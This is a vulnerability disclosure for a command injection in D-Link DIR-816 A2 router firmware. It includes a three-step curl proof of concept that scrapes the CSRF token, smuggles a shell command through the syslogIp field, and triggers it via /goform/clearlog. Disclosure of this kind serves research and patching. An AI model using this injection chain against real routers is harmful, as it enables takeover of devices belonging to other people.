# D-Link DIR-816 A2 Command Injection

**Vender** ：D-Link

**Firmware version**:1.10 B05

**Exploit Author**: nabla@galaxylab.org

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**:http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816

## Vul detail ##

In the handler of route `/goform/sylogapply`, the value of parameter `syslogIp` is read and set in nvram:

![](ida1.png)

But later in the handler of route `/goform/clearlog`, nvram is read for `syslogIp` and its value is used in the construction of command `syslogd -C4 -R %s ...`:

![](ida2.png)

So it could lead to command injection with crafted request.

## POC

There's a random token required by the route, which is used as a mitigation against CSRF. So first we need to get its value:

```bash
TOKENID=`curl -s http://192.168.0.1/dir_login.asp | grep tokenid | head -1 | grep -o 'value="[0-9]*"' | cut -f 2 -d = | tr -d '"'`
```

Then we send the crafted parameter along with the token to the route `/goform/sylogapply`:

```bash
curl -i -X POST http://192.168.0.1/goform/sylogapply -d tokenid=$TOKENID -d remotesyslog=rl -d 'syslogIp=1.1.1.1;touch /tmp/test;'
```

Finally we visit `/goform/clearlog` to trigger the command execution:

```bash
curl -i -X POST http://192.168.0.1/goform/clearlog -d tokenid=$TOKENID
```

